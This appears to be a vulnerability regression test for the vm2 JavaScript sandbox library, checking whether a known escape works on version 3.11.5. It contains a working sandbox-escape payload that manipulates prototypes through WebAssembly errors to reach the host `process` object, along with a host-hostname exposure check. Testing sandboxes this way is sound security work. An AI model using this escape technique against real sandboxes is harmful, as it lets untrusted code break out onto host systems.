import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { createRequire } from "node:module";

const require = createRequire(import.meta.url);
const { NodeVM, VM } = require("vm2");
const manifest = JSON.parse(
  await readFile(new URL("./package.json", import.meta.url), "utf8"),
);
const version = manifest.dependencies.vm2;
const shouldEscape = version === "3.11.5";
const expression = `
const getProto = Buffer.call.call(Buffer.call, {}.__lookupGetter__, Buffer, "__proto__");
const setProto = Buffer.call.call(Buffer.call, {}.__lookupSetter__, Buffer, "__proto__");
async function recoverHostVersion() {
  try {
    await WebAssembly.compileStreaming();
  } catch (error) {
    Buffer.call.call(
      Buffer.call,
      setProto,
      Buffer.call.call(Buffer.call, getProto, error),
      null,
    );
  }
  try {
    await WebAssembly.compileStreaming();
  } catch (error) {
    return error.constructor.constructor("return process")().version;
  }
}
recoverHostVersion();
`;

let escaped = false;
let value;
let blocked;
try {
  value = await new VM().run(expression);
  escaped = value === process.version;
} catch (error) {
  blocked = error?.message;
}

assert.equal(escaped, shouldEscape);
if (!shouldEscape) assert.equal(typeof blocked, "string");

let hostIdentityExposed = false;
let hostIdentity;
let builtinBlocked;
try {
  hostIdentity = new NodeVM({
    require: { external: true, builtin: ["*"] },
  }).run('module.exports = require("os").hostname();', "identity.js");
  hostIdentityExposed = hostIdentity === process.env.COMPUTERNAME;
  if (process.platform !== "win32") {
    hostIdentityExposed =
      typeof hostIdentity === "string" && hostIdentity.length > 0;
  }
} catch (error) {
  builtinBlocked = error?.message;
}

assert.equal(hostIdentityExposed, shouldEscape);
if (!shouldEscape) assert.equal(typeof builtinBlocked, "string");
process.stdout.write(
  `${JSON.stringify({
    version,
    escaped,
    value,
    blocked,
    hostIdentityExposed,
    builtinBlocked,
  })}\n`,
);
